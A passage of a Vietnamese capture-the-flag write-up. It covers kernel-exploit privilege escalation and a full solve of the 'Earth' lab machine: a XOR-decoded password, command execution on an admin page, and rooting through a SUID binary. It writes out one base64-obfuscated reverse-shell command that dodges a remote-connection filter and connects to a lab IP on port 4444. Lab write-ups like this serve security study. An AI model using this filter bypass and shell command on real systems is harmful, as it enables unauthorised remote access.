![image](https://user-images.githubusercontent.com/86275419/224821082-52716563-fe3f-49d4-9c57-eeae920311d7.png)

Lấy shell thành công

![image](https://user-images.githubusercontent.com/86275419/224824571-c921cb6d-cc1d-4014-b890-7e8cab37eebe.png)

## Priv

`sudo -l`

![image](https://user-images.githubusercontent.com/86275419/224823794-767e1f92-1f1b-4af0-9f6d-03a6bcd57f12.png)

Có thông tin trong `sudo -l` nhưng mình không có cách nào có thể khai thác file `enc` này

Mình chạy thử linpeas trên máy này cũng không có manh mối gì, đến đây mình quyết định chạy `linux-exploit-suggester.sh` để khai thác lỗi về kernel (cách này mình được khuyến khích là không nên vì nguy hiểm)

![image](https://user-images.githubusercontent.com/86275419/224826123-a6b6ae5c-b669-4df7-92a7-d06d4151c598.png)

Tool gợi ý sử dụng PwnKit

[PoC](https://github.com/berdav/CVE-2021-4034)

Lúc nãy mình có lỡ nghịch con server nên giờ PoC này không chạy được nên mình sẽ tìm một CVE khác 

`CVE-2017-16995`, mọi người tải về tại [đây](https://www.exploit-db.com/exploits/45010)

![image](https://user-images.githubusercontent.com/86275419/224831878-1aed3775-8ecd-47b4-bbee-dc9dcd61f026.png)

Done!

![image](https://user-images.githubusercontent.com/86275419/224831927-f318cd5a-2cb8-422b-9781-4741cdb383f6.png)


# 6. Earth

## Scan

![image](https://user-images.githubusercontent.com/86275419/224834150-e5207c9e-b494-44b4-b886-2a74d079b466.png)

IP: `192.168.44.120`

![image](https://user-images.githubusercontent.com/86275419/224834746-38d46afd-bbb2-4157-8983-6b50d819f017.png)

Bài này yêu cầu ta phải config dns

![image](https://user-images.githubusercontent.com/86275419/224835135-ba2dcc40-f2c7-45e2-83af-db2cc385d3ac.png)

## Web Exploit

![image](https://user-images.githubusercontent.com/86275419/224835528-4117bbdd-0c09-4594-925d-71af8203bafa.png)

Fuzz subdir

![image](https://user-images.githubusercontent.com/86275419/224837567-b018b8b4-951b-4b79-a3f1-d32feeff0ed1.png)

![image](https://user-images.githubusercontent.com/86275419/224837666-10b6253c-bf38-40fe-bd34-6e0e47009286.png)

Truy cập /robots.txt và /admin xem có gì hay không

![image](https://user-images.githubusercontent.com/86275419/224841622-b622f279-dca7-4444-ad98-de7d202448f2.png)

![image](https://user-images.githubusercontent.com/86275419/224837746-767e97e5-4301-45dd-8713-be5dd9b0fcbb.png)

Ta chú ý vào `/testingnotes.*`

Ta thử lần lượt các extension phổ biến

![image](https://user-images.githubusercontent.com/86275419/224838120-56a38b4a-d676-43a7-98a5-e9d84ea190de.png)

`.txt` cho ta một số thông tin
+ Thông điệp được mã hóa bằng XOR (thông điệp ta lấy ở earth.local)
+ Key đặt ở file testdata.txt
+ User là `terra`

file testdata.txt:

![image](https://user-images.githubusercontent.com/86275419/224840204-c2882b27-debf-40a4-b10c-f9eb981cf9e0.png)

Giờ ta đi giải mã thôi, ở đây mình sử dụng CyberChef

![image](https://user-images.githubusercontent.com/86275419/224840897-efa7f938-3c83-49a9-b0f4-787fd1fb3035.png)

Để ý kỹ thì thấy rằng 2 thông điệp đầu hoàn toàn vô nghĩa, thông điệp thứ 3 là lặp lại của một từ `earthclimatechangebad4humans` -> đây là mật khẩu 

Giờ ta sẽ login vào thử

![image](https://user-images.githubusercontent.com/86275419/224841330-22c6e04d-05ad-419d-a95e-4f9cfba852f4.png)

Login thành công

![image](https://user-images.githubusercontent.com/86275419/224841753-f3293d1a-e095-48f0-8225-41a264682ef8.png)

Đây là trang cho phép ta chạy command, vậy thì giờ ta chỉ cần tạo reverse shell về thôi 

![image](https://user-images.githubusercontent.com/86275419/224841991-cb3eba31-a012-4790-bf8c-f5bb1b947f03.png)

:)) Đúng là đời không như là mơ `Remote connections are forbidden`

Giờ mình phải tìm cách khác để lấy được shell về

Sau một hồi tìm hiểu thì mình tìm được cách bypass như sau

Đầu tiên mình encode base64 reverse shell của mình 

![image](https://user-images.githubusercontent.com/86275419/224843464-f7761aaa-fd0b-4c88-a0aa-7993f71d5e70.png)

Sau đó tại CLI Command, mình sẽ chạy lệnh decode làm đầu vào của `bash` để thực thi

`echo 'c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC40NC4xMTUvNDQ0NCAwPiYxCg==' | base64 -d | bash`

![image](https://user-images.githubusercontent.com/86275419/224843906-a6367fca-2939-42e4-9796-fe80943d88df.png)

![image](https://user-images.githubusercontent.com/86275419/224843859-89967af9-bbd1-4fde-b25a-46bdec74d341.png)

Vậy là ta đã lấy được shell

## Priv

Giờ nhanh chóng thì mình vác linpeas sang chạy xem có thông tin gì khai thác được không

![image](https://user-images.githubusercontent.com/86275419/224845462-081dc9d5-e748-41b5-8a9d-1d1355587d65.png)

Để ý suid có một file `reset_root` khá là lạ, mình sẽ exploit xem có gì không

![image](https://user-images.githubusercontent.com/86275419/224846184-5b5b0055-a087-4c5d-943e-c00053251dc2.png)

Chạy thử thì mình cũng chưa biết nó thực hiện cái gì 

![image](https://user-images.githubusercontent.com/86275419/224846288-fa577986-26a3-4d9b-bd62-ef2124e7ec34.png)

Sử dụng `strings` để xem binary thì thấy nó có command thay đổi password root thành `earth`, nhưng khi mình chạy nó lại fail, đến đây mình stuck hoàn toàn do chưa có kiến thức về reverse

Sau khi tham khảo một số WU trên mạng thì mình biết được một số thông tin sau

![image](https://user-images.githubusercontent.com/86275419/224847124-f9723f63-84a3-40af-a934-d4118e7ac001.png)

Đây là code của reset_root sau khi reverse. Pasword sẽ thay đổi nếu xảy ra 3 điều kiện dưới đây

![image](https://user-images.githubusercontent.com/86275419/224847965-96ef0f1c-7e7f-49c0-90ff-bbde7ba78f4c.png)

+ Điều kiện 1: truy cập được /dev/shm/kHgTFI5G
+ Điều kiện 2: truy cập được /dev/shm/Zw7bV9U5
+ Điều kiện 3: truy cập được /tmp/kcM0Wewe

Vì vậy, bây giờ ta phải tạo được 3 file ở đúng vị trí như trên 

![image](https://user-images.githubusercontent.com/86275419/224848404-50385bc7-2df0-440b-af44-c5e466a72aff.png)

Chạy lại `reset_root`

![image](https://user-images.githubusercontent.com/86275419/224848500-ea479b5b-ab5f-44f6-b1c1-e0245955bc94.png)

Vậy là đã đổi password root sang Earth thành công

![image](https://user-images.githubusercontent.com/86275419/224848650-efea7647-55f0-47a5-834d-dc328ec0b144.png)

Done!

![image](https://user-images.githubusercontent.com/86275419/224848714-6c2c5607-65d3-4c22-b921-4a9a7a8490c4.png)

# 7. 













